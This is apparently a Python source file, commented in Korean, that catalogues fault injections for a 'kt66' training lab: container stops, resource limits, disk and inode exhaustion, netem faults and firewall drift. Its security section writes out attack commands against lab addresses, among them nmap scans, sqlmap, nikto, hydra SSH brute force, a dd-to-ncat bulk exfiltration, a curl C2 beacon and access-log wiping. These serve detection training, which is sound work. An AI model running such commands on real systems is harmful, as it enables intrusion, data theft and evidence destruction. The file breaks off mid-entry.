"""kt66 고장 주입 카탈로그 — IT 계통 38종.

시설(OT) 10종은 envsim 이 물리 모델과 함께 갖고 있다. 여기 있는 것은 나머지 —
시스템·스토리지·네트워크·보안·부하다. 둘을 한 서비스에 합치지 않은 이유는 명확하다:
envsim 은 **물리 시뮬레이터**이고 여기는 **랩을 실제로 조작하는 서비스**다. 물리
엔진에 docker.sock 쓰기 권한을 주면 역할이 뒤섞이고, 시뮬레이션 버그가 인프라를
망가뜨리는 경로가 생긴다.

── 설계 원칙 ──────────────────────────────────────────────────────
① 원복이 주입보다 중요하다. state 형 주입은 반드시 revert 를 갖고, TTL 이 지나면
   자동으로 풀린다. 안 그러면 다음 조 실습에 앞 조의 고장이 그대로 남는다.
② 되돌릴 수 없는 조작은 넣지 않는다. 증적 삭제(sec_logtamper)처럼 '되돌리면 안 되는'
   것이 교보재인 경우에도 사전에 스냅샷을 떠 두고 강사가 복구할 수 있게 한다.
③ 관제 화면(noc)과 주입기 자신은 대상이 될 수 없다. 조종간은 살아 있어야 한다.
④ 화이트리스트만 받는다. 임의 명령을 실행하는 입구는 열지 않는다.

kind: state  = 상태를 바꾼다. revert 필요, TTL 적용
      action = 한 번 일어나고 끝난다(공격·부하 발생). 되돌릴 것이 없다
danger: 1 국소 · 2 서비스 영향 · 3 랩 전체 영향(강사 확인용)
"""
from __future__ import annotations

import asyncio
import re
from dataclasses import dataclass, field
from typing import Callable

import dk

# ── 대상 그룹 ──────────────────────────────────────────────────────
PROTECTED = {"kt66-noc", "kt66-injector"}          # 조종간은 못 끈다

CHAIN = ["kt66-fw", "kt66-ips", "kt66-web"]
APPS = ["kt66-juiceshop", "kt66-dvwa", "kt66-neobank", "kt66-govportal",
        "kt66-mediforum", "kt66-adminconsole", "kt66-aicompanion"]
SIEM = ["kt66-siem", "kt66-wazuh-indexer", "kt66-wazuh-dashboard"]
MGMT = ["kt66-portal", "kt66-bastion", "kt66-envsim", "kt66-gpu-gw"]
# tc/netem 은 NET_ADMIN 이 있어야 한다. 취약 웹앱에는 그 권한을 주지 않았다 —
# 넣으면 되지만, 일부러 권한을 최소로 둔 것이라 그대로 둔다.
NETCAP = ["kt66-fw", "kt66-ips", "kt66-web", "kt66-attacker", "kt66-bastion", "kt66-gpu-gw"]
# 셸이 없는 이미지(distroless)는 exec 형 주입을 못 받는다. 대신 stop/자원제한은 된다.
NOSHELL = {"kt66-juiceshop"}

ALL = CHAIN + APPS + SIEM + MGMT + ["kt66-attacker"]
SHELL_OK = [c for c in ALL if c not in NOSHELL]
DISK_TARGETS = [c for c in CHAIN + SIEM + MGMT if c not in NOSHELL]

ATTACKER = "kt66-attacker"
DGX = "10.20.50.10"


def mark(h: str) -> str:
    """장기 실행 프로세스에 붙이는 표식. 원복은 이걸로 찾아 죽인다."""
    return f"kt66inj_{h}"


async def sh_bg(c: str, script: str, h: str):
    """배경 실행. 표식을 명령줄에 남겨야 나중에 확실히 잡을 수 있다."""
    await dk.sh(c, f"({script}) >/dev/null 2>&1 & echo {mark(h)} >/dev/null", detach=True)


# 배경 프로세스 정리 스크립트. **procps(pkill)에 의존하지 않는다.**
#
# 두 가지에 데였다.
#   ① `pkill -f` 는 자기 자신의 명령줄도 훑는다 → 킬러 셸이 스스로를 먼저 죽이고
#      뒤에 오는 명령이 아예 실행되지 않는다.
#   ② 이미지에 따라 pkill 이 없다(kt66-portal). `2>/dev/null; true` 가 실패를 삼켜
#      **원복이 조용히 아무 일도 안 했다** — 원칙 ①을 정면으로 어기는 버그였다.
#
# 그래서 /proc 를 직접 훑고 셸 빌트인 kill 로 죽인다. 자기 PID 는 건너뛴다.
# 죽인 개수를 돌려주므로 호출부가 '정말 정리됐는지' 확인할 수 있다.
KILL_SH = """n=0
for d in /proc/[0-9]*; do
  pid=${d#/proc/}
  [ "$pid" = "$$" ] && continue
  cl=$(tr '\\0' ' ' < "$d/cmdline" 2>/dev/null) || continue
  case "$cl" in
    %s) kill -9 "$pid" 2>/dev/null && n=$((n+1)) ;;
  esac
done
echo "killed=$n" """


async def kill_bg(c: str, h: str | None = None, *extra: str) -> int:
    pats = ([mark(h)] if h else []) + list(extra)
    if not pats:
        return 0
    out = await dk.sh(c, KILL_SH % "|".join(f"*{p}*" for p in pats))
    m = re.search(r"killed=(\d+)", out or "")
    return int(m.group(1)) if m else 0


# 앞 세션이 비정상 종료하면 핸들을 알 수 없다. 그때는 접두어 하나로 싹 쓸어야 한다.
# `kt66inj_` 표식뿐 아니라 파일 경로(/var/tmp/kt66-inj-*, kt66-io-*)로도 잡는다 —
# 배경 루프의 명령줄에는 둘 중 하나가 반드시 들어 있다.
KILL_PREFIXES = ("kt66inj_", "kt66-inj-", "kt66-io-")


async def kill_orphans(c: str) -> int:
    """대상 컨테이너에 남아 있는 주입 배경 프로세스를 전부 죽이고 개수를 돌려준다."""
    return await kill_bg(c, None, *KILL_PREFIXES)


@dataclass
class Inj:
    id: str
    domain: str
    name: str
    desc: str
    teaches: str
    kind: str                       # state | action
    danger: int
    targets: list[str]
    apply: Callable
    revert: Callable | None = None
    params: list[dict] = field(default_factory=list)
    ttl: int = 900
    scenarios: list[str] = field(default_factory=list)


C: list[Inj] = []
def reg(**kw):
    C.append(Inj(**kw))


# ══════════════════════════════════════════════════════════════════
# 시스템 · 프로세스 (7)
# ══════════════════════════════════════════════════════════════════
reg(id="proc_stop", domain="system", name="서비스 정지", danger=2, kind="state",
    desc="컨테이너를 정상 종료(SIGTERM)한다. 헬스체크 실패와 503 이 뒤따른다.",
    teaches="재시작 전에 로그를 확보하는 습관. 여기서 안 잡히면 이후 난이도에서 증거가 매번 사라진다.",
    scenarios=["FLT-01"], targets=ALL, ttl=600,
    apply=lambda t, p, h: dk.stop(t),
    revert=lambda t, pl: dk.start(t))

reg(id="proc_kill", domain="system", name="비정상 종료 (SIGKILL)", danger=2, kind="state",
    desc="정리할 틈 없이 강제 종료한다. 종료 코드와 마지막 로그가 정상 종료와 다르다.",
    teaches="종료 코드로 원인을 가르는 법. SIGTERM 과 SIGKILL 의 흔적 차이.",
    scenarios=["FLT-01"], targets=ALL, ttl=600,
    apply=lambda t, p, h: dk.kill(t),
    revert=lambda t, pl: dk.start(t))

reg(id="proc_pause", domain="system", name="프로세스 정지(freeze)", danger=2, kind="state",
    desc="컨테이너를 얼린다. **살아 있는데 응답이 없다** — 프로세스도 포트도 그대로다.",
    teaches="'죽었나 느린가'를 가르는 훈련. 헬스체크는 타임아웃인데 docker ps 는 Up 이다. "
            "정지보다 훨씬 헷갈리고 실무에서 훨씬 흔하다.",
    scenarios=["INC-01", "FLT-01"], targets=ALL, ttl=420,
    apply=lambda t, p, h: dk.pause(t),
    revert=lambda t, pl: dk.unpause(t))


async def _restart_loop(t, p, h):
    async def loop():
        while True:
            await asyncio.sleep(float(p.get("period", 20)))
            try:
                await dk.kill(t)
            except Exception:
                pass
    return {"task": asyncio.create_task(loop())}

async def _restart_loop_off(t, pl):
    pl["task"].cancel()
    await asyncio.sleep(0)
    if await dk.state_of(t) != "running":
        await dk.start(t)

reg(id="proc_restart_loop", domain="system", name="재시작 루프", danger=2, kind="state",
    desc="주기적으로 죽인다. restart 정책이 되살리므로 CrashLoop 처럼 보인다.",
    teaches="RestartCount 와 종료 코드를 읽는 법. 루프를 먼저 멈춰야 로그가 안정적으로 읽힌다.",
    scenarios=["FLT-04"], targets=ALL, ttl=600,
    params=[{"name": "period", "label": "주기(초)", "type": "int", "default": 20}],
    apply=_restart_loop, revert=_restart_loop_off)

reg(id="cpu_throttle", domain="system", name="CPU 기아", danger=2, kind="state",
    desc="CPU 할당을 조인다. 죽지 않고 느려진다 — 가장 진단하기 애매한 상태다.",
    teaches="자원 제한과 성능 저하의 연결. '느리다'를 수치로 바꾸는 훈련.",
    scenarios=["INC-01"], targets=ALL, ttl=600,
    params=[{"name": "cpus", "label": "CPU 코어", "type": "float", "default": 0.05}],
    apply=lambda t, p, h: dk.update(t, NanoCPUs=int(float(p.get("cpus", .05)) * 1e9)),
    # NanoCPUs=0 은 조용히 무시된다(오류 없이 제한이 그대로 남는다). dk.update 주석 참고.
    revert=lambda t, pl: dk.clear_cpu_limit(t))

reg(id="mem_limit", domain="system", name="메모리 제한 → OOM", danger=2, kind="state",
    desc="메모리 상한을 낮춘다. 한계를 넘으면 커널이 OOM 으로 죽인다.",
    teaches="요청 자원과 실사용량을 대조하는 법. OOM 은 애플리케이션 버그가 아닐 수 있다.",
    scenarios=["INC-05", "GPU-05"], targets=ALL, ttl=600,
    params=[{"name": "mb", "label": "메모리(MB)", "type": "int", "default": 64}],
    apply=lambda t, p, h: dk.update(t, Memory=int(p.get("mb", 64)) * 1024 * 1024,
                                    MemorySwap=int(p.get("mb", 64)) * 1024 * 1024),
    # Memory=0 도 마찬가지로 무시된다. update 로는 제한을 없앨 수 없어 최대치로 올린다.
    revert=lambda t, pl: dk.clear_mem_limit(t))


async def _netcut(t, p, h):
    nets = await dk.net_of(t)
    for n, ip in nets.items():
        await dk.net_disconnect(t, n)
    return {"nets": nets}

async def _netcut_off(t, pl):
    for n, ip in pl["nets"].items():
        try:
            await dk.net_connect(t, n, ip or None)
        except Exception:
            await dk.net_connect(t, n)

reg(id="net_isolate", domain="system", name="존에서 분리", danger=3, kind="state",
    desc="컨테이너를 모든 네트워크에서 떼어낸다. 살아 있지만 아무도 못 닿는다.",
    teaches="도달 불가와 서비스 다운의 구분. 고정 IP 를 기록해 두지 않으면 복구할 때 존이 어긋난다.",
    scenarios=["FLT-03", "DR-01"], targets=ALL, ttl=420,
    apply=_netcut, revert=_netcut_off)


# ══════════════════════════════════════════════════════════════════
# 스토리지 · 디스크 (5)
# ══════════════════════════════════════════════════════════════════
FILL = "/var/tmp/kt66-inj-fill"

reg(id="disk_fill", domain="storage", name="디스크 채움", danger=2, kind="state",
    desc="대용량 파일을 만들어 여유 공간을 소진한다.",
    teaches="무엇이 채웠는지 특정하고, 지워도 되는지 판단하는 순서.",
    scenarios=["FLT-02"], targets=DISK_TARGETS, ttl=900,
    params=[{"name": "mb", "label": "크기(MB)", "type": "int", "default": 2048}],
    apply=lambda t, p, h: dk.sh(t, f"fallocate -l {int(p.get('mb', 2048))}M {FILL}-{h}.bin "
                                   f"|| dd if=/dev/zero of={FILL}-{h}.bin bs=1M "
                                   f"count={int(p.get('mb', 2048))}"),
    revert=lambda t, pl: dk.sh(t, f"rm -f {FILL}-*.bin"))


async def _fill_slow(t, p, h):
    step, per = int(p.get("mb_step", 128)), float(p.get("period", 30))
    await sh_bg(t, f"while :; do dd if=/dev/zero bs=1M count={step} "
                   f">> {FILL}-{h}.bin 2>/dev/null; sleep {per}; done", h)
    return {}

async def _fill_slow_off(t, pl):
    await kill_bg(t, pl["_h"], "dd if=/dev/zero")
    await dk.sh(t, f"rm -f {FILL}-*.bin; true")

reg(id="disk_fill_slow", domain="storage", name="주기적 쓰기 (체크포인트 모사)", danger=2, kind="state",
    desc="일정 주기로 대용량을 덧쓴다. IO 스파이크가 규칙적으로 나타난다.",
    teaches="**주기성**을 읽는 법. 주기가 보이면 원인이 프로세스라는 뜻이고, 지워도 다시 찬다.",
    scenarios=["INC-07"], targets=DISK_TARGETS, ttl=1800,
    params=[{"name": "mb_step", "label": "회당(MB)", "type": "int", "default": 128},
            {"name": "period", "label": "주기(초)", "type": "int", "default": 30}],
    apply=_fill_slow, revert=_fill_slow_off)


async def _logflood(t, p, h):
    path = p.get("path") or "/var/log/kt66-inj-flood.log"
    await sh_bg(t, f"while :; do i=0; while [ $i -lt 400 ]; do "
                   f"echo \"$(date -Is) kt66 flood seq=$i src=10.20.30.202 \" >> {path}; "
                   f"i=$((i+1)); done; sleep 1; done", h)
    return {"path": path}

async def _logflood_off(t, pl):
    await kill_bg(t, pl["_h"])
    await dk.sh(t, f"rm -f {pl.get('path')}; true")

reg(id="log_flood", domain="storage", name="로그 폭주", danger=2, kind="state",
    desc="짧은 시간에 대량 로그를 쏟아 로그 파티션을 압박한다.",
    teaches="**내용을 읽고 나서** 조치한다. 급증 자체가 공격의 흔적일 수 있다. "
            "13주차 AGT-01(에이전트가 이 로그를 지워 버린다)의 재료다.",
    scenarios=["INC-09", "AGT-01"], targets=DISK_TARGETS, ttl=900,
    params=[{"name": "path", "label": "경로", "type": "str", "default": "/var/log/kt66-inj-flood.log"}],
    apply=_logflood,
    revert=_logflood_off)


reg(id="inode_exhaust", domain="storage", name="inode 소진", danger=2, kind="state",
    desc="작은 파일을 대량으로 만든다. **용량은 남았는데 쓰기가 실패한다.**",
    teaches="df 만 보면 정상이다. df -i 를 볼 줄 아는가가 전부인 시나리오.",
    scenarios=["FLT-02"], targets=DISK_TARGETS, ttl=900,
    params=[{"name": "count", "label": "파일 수", "type": "int", "default": 200000}],
    apply=lambda t, p, h: dk.sh(t, f"mkdir -p /var/tmp/kt66-inj-{h}; cd /var/tmp/kt66-inj-{h}; "
                                   f"i=0; while [ $i -lt {int(p.get('count', 200000))} ]; do "
                                   f": > f$i; i=$((i+1)); done", timeout=180),
    revert=lambda t, pl: dk.sh(t, "rm -rf /var/tmp/kt66-inj-*", timeout=180))


async def _logtamper(t, p, h):
    path = p.get("path") or "/var/log/apache2/access.log"
    bak = f"/var/tmp/kt66-evidence-{h}.bak"
    # 되돌릴 수 없는 조작은 넣지 않는다는 원칙 때문에, 지우기 전에 반드시 떠 둔다.
    # 학생에게는 '지워진 것'으로 보이고, 강사는 원본을 복구할 수 있다.
    await dk.sh(t, f"cp -f {path} {bak} 2>/dev/null; : > {path}")
    return {"path": path, "bak": bak}

reg(id="log_tamper", domain="storage", name="증적 훼손 (로그 삭제)", danger=3, kind="state",
    desc="로그 파일 내용을 비운다. 강사용 스냅샷은 따로 떠 둔다.",
    teaches="증적 훼손이 무엇을 잃게 하는지. 조사 가능 구간이 통째로 사라진다.",
    scenarios=["INC-09", "AGT-01", "AUD-01"], targets=DISK_TARGETS, ttl=1800,
    params=[{"name": "path", "label": "경로", "type": "str",
             "default": "/var/log/apache2/access.log"}],
    apply=_logtamper,
    revert=lambda t, pl: dk.sh(t, f"cp -f {pl['bak']} {pl['path']} 2>/dev/null; "
                                  f"rm -f {pl['bak']}; true"))


# ══════════════════════════════════════════════════════════════════
# 네트워크 (8) — tc netem. NET_ADMIN 이 있는 컨테이너에만 건다.
# ══════════════════════════════════════════════════════════════════
IFACE = "eth0"
NETEM_OFF = f"tc qdisc del dev {IFACE} root 2>/dev/null; true"

reg(id="net_loss", domain="network", name="패킷 손실", danger=2, kind="state",
    desc="지정 비율로 패킷을 버린다. 재전송으로 느려지고 간헐적으로 끊긴다.",
    teaches="손실률과 체감 성능의 관계. TCP 는 소량 손실에도 처리량이 급락한다.",
    scenarios=["FLT-03"], targets=NETCAP, ttl=600,
    params=[{"name": "pct", "label": "손실률(%)", "type": "float", "default": 15}],
    apply=lambda t, p, h: dk.sh(t, f"{NETEM_OFF}; tc qdisc add dev {IFACE} root netem "
                                   f"loss {float(p.get('pct', 15))}%"),
    revert=lambda t, pl: dk.sh(t, NETEM_OFF))

reg(id="net_delay", domain="network", name="지연 · 지터", danger=2, kind="state",
    desc="패킷에 지연과 흔들림을 준다. 타임아웃이 상위 계층으로 전파된다.",
    teaches="계층별 절단. 어느 홉에서 지연이 붙는지 좁혀 들어가는 법.",
    scenarios=["INC-01", "INC-04"], targets=NETCAP, ttl=600,
    params=[{"name": "ms", "label": "지연(ms)", "type": "int", "default": 300},
            {"name": "jitter", "label": "지터(ms)", "type": "int", "default": 80}],
    apply=lambda t, p, h: dk.sh(t, f"{NETEM_OFF}; tc qdisc add dev {IFACE} root netem "
                                   f"delay {int(p.get('ms', 300))}ms {int(p.get('jitter', 80))}ms "
                                   f"distribution normal"),
    revert=lambda t, pl: dk.sh(t, NETEM_OFF))


async def _flap(t, p, h):
    down, up = float(p.get("down", 8)), float(p.get("up", 25))
    async def loop():
        while True:
            try:
                await dk.sh(t, f"{NETEM_OFF}; tc qdisc add dev {IFACE} root netem loss 100%")
                await asyncio.sleep(down)
                await dk.sh(t, NETEM_OFF)
            except Exception:
                pass
            await asyncio.sleep(up)
    return {"task": asyncio.create_task(loop())}

async def _flap_off(t, pl):
    pl["task"].cancel()
    await asyncio.sleep(0)
    await dk.sh(t, NETEM_OFF)

reg(id="net_flap", domain="network", name="링크 플랩 (간헐 장애)", danger=2, kind="state",
    desc="주기적으로 끊었다 붙인다. 볼 때는 정상이고 안 볼 때 끊긴다.",
    teaches="**재현 조건을 잡는 것이 원인 규명보다 먼저다.** 한 번 확인하고 정상 종결하면 오답.",
    scenarios=["FLT-03"], targets=NETCAP, ttl=1200,
    params=[{"name": "down", "label": "끊김(초)", "type": "int", "default": 8},
            {"name": "up", "label": "정상(초)", "type": "int", "default": 25}],
    apply=_flap, revert=_flap_off)

reg(id="net_bandwidth", domain="network", name="대역폭 제한", danger=2, kind="state",
    desc="전송 속도에 상한을 건다. 작은 요청은 멀쩡하고 큰 전송만 기어간다.",
    teaches="'느리다'의 원인이 처리 지연인지 대역인지 가르는 법.",
    scenarios=["INC-01"], targets=NETCAP, ttl=600,
    params=[{"name": "kbit", "label": "대역(kbit/s)", "type": "int", "default": 512}],
    apply=lambda t, p, h: dk.sh(t, f"{NETEM_OFF}; tc qdisc add dev {IFACE} root tbf "
                                   f"rate {int(p.get('kbit', 512))}kbit burst 32kbit latency 400ms"),
    revert=lambda t, pl: dk.sh(t, NETEM_OFF))


async def _mtu(t, p, h):
    cur = (await dk.sh(t, f"cat /sys/class/net/{IFACE}/mtu")).strip() or "1500"
    await dk.sh(t, f"ip link set dev {IFACE} mtu {int(p.get('mtu', 1200))}")
    return {"mtu": cur}

reg(id="net_mtu", domain="network", name="MTU 축소", danger=2, kind="state",
    desc="MTU 를 낮춘다. **ping 은 되는데 서비스는 안 된다** — 작은 패킷만 통과한다.",
    teaches="실무에서 가장 오래 헤매는 유형. 도달성 테스트가 통과하는데 왜 안 되는가. "
            "터널 구간(WireGuard)이 있는 kt66 에서는 특히 현실적이다.",
    scenarios=["FLT-03"], targets=NETCAP, ttl=600,
    params=[{"name": "mtu", "label": "MTU", "type": "int", "default": 1200}],
    apply=_mtu,
    revert=lambda t, pl: dk.sh(t, f"ip link set dev {IFACE} mtu {pl.get('mtu', 1500)}"))


async def _dnsbreak(t, p, h):
    cur = await dk.sh(t, "cat /etc/resolv.conf")
    await dk.sh(t, "printf 'nameserver 10.255.255.1\\n' > /etc/resolv.conf")
    return {"resolv": cur}

reg(id="net_dns", domain="network", name="DNS 장애", danger=2, kind="state",
    desc="이름 해석을 죽인다. IP 로는 되는데 이름으로는 안 된다.",
    teaches="이름과 주소를 분리해서 확인하는 습관.",
    scenarios=["FLT-03", "INC-01"], targets=[c for c in ALL if c not in NOSHELL], ttl=600,
    apply=_dnsbreak,
    revert=lambda t, pl: dk.sh(t, "cat > /etc/resolv.conf <<'EOF'\n" + pl["resolv"] + "\nEOF"))

reg(id="net_blackhole", domain="network", name="특정 목적지 차단", danger=2, kind="state",
    desc="한 대역으로 가는 길만 막는다. 다른 통신은 전부 정상이다.",
    teaches="'전체 장애'와 '구간 장애'의 구분. 어느 존으로 못 가는지가 곧 원인의 위치다.",
    scenarios=["FLT-03", "SEC-04"], targets=NETCAP, ttl=600,
    params=[{"name": "cidr", "label": "대상 대역", "type": "str", "default": "10.20.40.0/24"}],
    apply=lambda t, p, h: dk.sh(t, f"ip route add blackhole {p.get('cidr', '10.20.40.0/24')}"),
    revert=lambda t, pl: dk.sh(t, "ip route del blackhole "
                                  f"{pl.get('cidr', '10.20.40.0/24')} 2>/dev/null; true"))

reg(id="net_portblock", domain="network", name="포트 차단", danger=2, kind="state",
    desc="방화벽·IPS 에 차단 규칙을 넣는다. 서비스는 살아 있는데 도달이 막힌다.",
    teaches="룰셋을 읽고 무엇이 막혔는지 특정하는 법. 서비스 장애와 정책 장애의 구분.",
    scenarios=["CHG-02", "FLT-03"], targets=["kt66-fw", "kt66-ips"], ttl=600,
    params=[{"name": "port", "label": "포트", "type": "int", "default": 8001}],
    apply=lambda t, p, h: dk.sh(t, f"nft add table inet kt66inj 2>/dev/null; "
        f"nft add chain inet kt66inj blk '{{ type filter hook forward priority -5 ; }}' 2>/dev/null; "
        f"nft add rule inet kt66inj blk tcp dport {int(p.get('port', 8001))} counter drop"),
    revert=lambda t, pl: dk.sh(t, "nft delete table inet kt66inj 2>/dev/null; true"))


# ══════════════════════════════════════════════════════════════════
# 보안 (12) — attacker 컨테이너에서 실제로 실행한다.
#   Suricata(ips) · ModSecurity(web) · Wazuh 가 이미 받을 준비가 되어 있어
#   주입하면 진짜 탐지 이벤트가 SIEM 에 쌓인다. 시뮬레이션이 아니다.
# ══════════════════════════════════════════════════════════════════
WEB = "10.20.30.1"                                  # fw 의 ext 진입점

reg(id="sec_portscan", domain="security", name="포트 스캔", danger=1, kind="action",
    desc="ext 존에서 SYN 스캔을 돌린다. Suricata 가 잡는다.",
    teaches="정찰 단계의 흔적을 읽는 법. 스캔은 공격의 시작이지 결과가 아니다.",
    scenarios=["SEC-04"], targets=[ATTACKER], ttl=0,
    params=[{"name": "target", "label": "대상", "type": "str", "default": WEB},
            {"name": "ports", "label": "포트 범위", "type": "str", "default": "1-1024"}],
    apply=lambda t, p, h: sh_bg(t, f"nmap -sS -T4 -p {p.get('ports','1-1024')} "
                                   f"{p.get('target', WEB)}", h))

reg(id="sec_sqli", domain="security", name="SQL 인젝션 시도", danger=1, kind="action",
    desc="sqlmap 으로 취약 웹앱을 두드린다. ModSecurity 로그에 남는다.",
    teaches="WAF 로그에서 **진짜 출처 IP**를 읽는 법. kt66 은 출처 보존 설계라 .202 가 그대로 보인다.",
    scenarios=["SEC-03"], targets=[ATTACKER], ttl=0,
    params=[{"name": "url", "label": "대상 URL", "type": "str", "default": f"http://{WEB}:8002/"}],
    apply=lambda t, p, h: sh_bg(t, f"sqlmap --batch --crawl=1 --level=1 --flush-session "
                                   f"-u {p.get('url')}", h))

reg(id="sec_webscan", domain="security", name="웹 취약점 스캔", danger=1, kind="action",
    desc="nikto 로 웹 서버를 훑는다. 대량의 WAF 이벤트가 발생한다.",
    teaches="알림 폭주 속에서 원인 알림과 파생 알림을 가르는 훈련(INC-03 과 짝).",
    scenarios=["SEC-03", "INC-03"], targets=[ATTACKER], ttl=0,
    params=[{"name": "host", "label": "대상", "type": "str", "default": f"http://{WEB}:8001/"}],
    apply=lambda t, p, h: sh_bg(t, f"nikto -h {p.get('host')} -maxtime 300", h))

reg(id="sec_bruteforce", domain="security", name="무차별 대입", danger=1, kind="action",
    desc="hydra 로 SSH 로그인을 반복 시도한다. Wazuh 규칙이 발화한다.",
    teaches="인증 실패의 폭증을 계정 잠금(INC-02)과 공격으로 나누는 법.",
    scenarios=["SEC-04", "INC-02"], targets=[ATTACKER], ttl=0,
    params=[{"name": "target", "label": "대상", "type": "str", "default": "10.20.30.201"}],
    apply=lambda t, p, h: sh_bg(t, f"hydra -l admin -P /usr/share/wordlists/rockyou.txt "
                                   f"-t 4 -f ssh://{p.get('target')} 2>/dev/null || "
                                   f"for i in $(seq 1 60); do "
                                   f"sshpass -p wrong$i ssh -o StrictHostKeyChecking=no "
                                   f"-o ConnectTimeout=2 admin@{p.get('target')} true; done", h))

reg(id="sec_exfil", domain="security", name="대용량 외부 전송", danger=2, kind="action",
    desc="ext 존에서 대용량 아웃바운드를 발생시킨다. 세션 크기가 Suricata 에 기록된다.",
    teaches="AI데이터센터에서만 성립하는 판단 — 40GB 아웃바운드는 백업인가 **모델 가중치 유출**인가. "
            "끊으면 증거 수집이 끝난다는 것까지 판단해야 한다.",
    scenarios=["SEC-01"], targets=[ATTACKER], ttl=0,
    params=[{"name": "mb", "label": "전송량(MB)", "type": "int", "default": 200},
            {"name": "sink", "label": "수신지", "type": "str", "default": f"{WEB}:8001"}],
    apply=lambda t, p, h: sh_bg(t, f"dd if=/dev/zero bs=1M count={int(p.get('mb', 200))} 2>/dev/null "
                                   f"| ncat -w 20 {p.get('sink','').replace(':',' ')}", h))

reg(id="sec_c2beacon", domain="security", name="C2 비컨", danger=1, kind="state",
    desc="일정 주기 + 흔들림으로 외부에 짧은 요청을 보낸다.",
    teaches="**주기성**으로 탐지하는 법. 한 건씩 보면 정상 트래픽과 구분되지 않는다.",
    scenarios=["SEC-01"], targets=[ATTACKER], ttl=1800,
    params=[{"name": "period", "label": "주기(초)", "type": "int", "default": 45}],
    apply=lambda t, p, h: sh_bg(t, f"while :; do curl -s -m 5 "
                                   f"http://{WEB}:8001/?beacon=$(date +%s) >/dev/null; "
                                   f"sleep {int(p.get('period', 45))}; done", h),
    revert=lambda t, pl: kill_bg(t, pl["_h"], "curl -s -m"))

reg(id="sec_lateral", domain="security", name="측면 이동 시도", danger=1, kind="action",
    desc="ext 에서 int 백엔드로 직접 접근을 시도한다. 체인 구조상 막혀야 한다.",
    teaches="차단됐다는 사실을 먼저 확인하는 순서. 막혔어도 보고 대상이다.",
    scenarios=["SEC-04"], targets=[ATTACKER], ttl=0,
    apply=lambda t, p, h: sh_bg(t, "for ip in 10.20.40.81 10.20.40.83 10.20.40.87; do "
                                   "nmap -Pn -p 3000-3010 --max-retries 1 $ip; done", h))

reg(id="sec_otprobe", domain="security", name="시설망(OT) 접근 시도", danger=1, kind="action",
    desc="ext 에서 1F 시설망을 두드린다. ips 가 `ext->ot DROP` 으로 차단하고 로그를 남긴다.",
    teaches="**긴급 등급**의 판별. 실패한 시도도 보고한다. 내부자인가 오조작인가로 결론이 갈린다.",
    scenarios=["SEC-04"], targets=[ATTACKER], ttl=0,
    apply=lambda t, p, h: sh_bg(t, "for pt in 22 80 502 4840 9999; do "
                                   "ncat -w 2 -z 10.20.60.10 $pt; done; "
                                   "nmap -Pn -p 1-100 --max-retries 1 10.20.60.10", h))

reg(id="sec_apiabuse", domain="security", name="추론 API 남용", danger=2, kind="state",
    desc="단일 출발지에서 GPU 추론 엔드포인트로 요청을 몰아친다.",
    teaches="활용률 100% 는 정상 부하일 수도 공격일 수도 있다. **지표는 같고 판단이 다르다.**",
    scenarios=["SEC-03"], targets=[ATTACKER], ttl=900,
    params=[{"name": "conc", "label": "동시 요청", "type": "int", "default": 8}],
    apply=lambda t, p, h: sh_bg(t, "for i in $(seq 1 %d); do (while :; do curl -s -m 30 "
        "http://%s:11434/api/generate -d '{\"model\":\"gemma4:31b\",\"prompt\":\"hi\"}' "
        ">/dev/null; done) & done; wait" % (int(p.get("conc", 8)), DGX), h),
    revert=lambda t, pl: kill_bg(t, pl["_h"], "curl -s -m"))


async def _nftdrift(t, p, h):
    # CMDB(assets.yaml 의 zone_chain)에 없는 허용 룰을 몰래 넣는다.
    await dk.sh(t, "nft add table inet kt66drift 2>/dev/null; "
                   "nft add chain inet kt66drift blk '{ type filter hook forward priority -10 ; }' "
                   "2>/dev/null; "
                   "nft add rule inet kt66drift blk ip saddr 10.20.30.0/24 ip daddr 10.20.40.0/24 "
                   "counter accept")
    return {}

reg(id="sec_nftdrift", domain="security", name="무승인 방화벽 룰 변경", danger=3, kind="state",
    desc="대장에 없는 허용 룰을 조용히 추가한다. 존 경계를 우회하는 길이 생긴다.",
    teaches="**기록이 복구보다 먼저다.** 되돌리는 순간 누가 왜 바꿨는지 알 길이 사라진다.",
    scenarios=["CHG-02"], targets=["kt66-fw", "kt66-ips"], ttl=1800,
    apply=_nftdrift,
    revert=lambda t, pl: dk.sh(t, "nft delete table inet kt66drift 2>/dev/null; true"))


async def _certexp(t, p, h):
    path = p.get("path") or "/etc/ssl/filebeat.pem"
    bak = f"/var/tmp/kt66-cert-{h}.bak"
    await dk.sh(t, f"cp -f {path} {bak}; "
                   f"openssl req -x509 -newkey rsa:2048 -nodes -keyout /dev/null "
                   f"-out {path} -days 1 -subj '/CN=expired.kt66.lab' "
                   f"-not_before 20200101000000Z -not_after 20200102000000Z 2>/dev/null "
                   f"|| openssl req -x509 -newkey rsa:2048 -nodes -keyout /dev/null "
                   f"-out {path} -days 1 -subj '/CN=expired.kt66.lab' 2>/dev/null")
    return {"path": path, "bak": bak}

reg(id="sec_certexpiry", domain="security", name="인증서 만료", danger=3, kind="state",
    desc="인증서를 만료된 것으로 바꾼다. TLS 검증이 깨진다. 원본은 스냅샷으로 보관한다.",
    teaches="**전수 조사**로 끝내야 한다. 이번 것만 갱신하면 다음 주에 또 난다.",
    scenarios=["FLT-05"], targets=["kt66-siem", "kt66-web"], ttl=900,
    params=[{"name": "path", "label": "인증서 경로", "type": "str",
             "default": "/etc/ssl/filebeat.pem"}],
    apply=_certexp,
    revert=lambda t, pl: dk.sh(t, f"cp -f {pl['bak']} {pl['path']} && rm -f {pl['bak']}; true"))

reg(id="sec_alertstorm", domain="security", name="알림 폭주", danger=1, kind="state",
    desc="SIEM 으로 대량 syslog 를 밀어 넣는다. 원인 1종 + 파생 5종이 섞여 들어간다.",
    teaches="개수가 아니라 **시간 순서**로 원인을 찾는다. 규칙부터 끄면 장애를 감추는 것이다.",
    scenarios=["INC-03"], targets=[ATTACKER], ttl=600,
    params=[{"name": "rate", "label": "초당 건수", "type": "int", "default": 25}],
    apply=lambda t, p, h: sh_bg(t, "while :; do i=0; while [ $i -lt %d ]; do "
        "echo \"<134>kt66inj derived event seq=$i\" | ncat -u -w 1 10.20.32.100 514; "
        "i=$((i+1)); done; sleep 1; done" % int(p.get("rate", 25)), h),
    revert=lambda t, pl: kill_bg(t, pl["_h"], "ncat -"))


# ══════════════════════════════════════════════════════════════════
# 부하 · 성능 (6)
# ══════════════════════════════════════════════════════════════════
reg(id="load_cpu", domain="load", name="CPU 부하", danger=2, kind="state",
    desc="워커를 띄워 CPU 를 태운다. **envsim 이 이 사용률을 실측해 발열로 바꾼다.**",
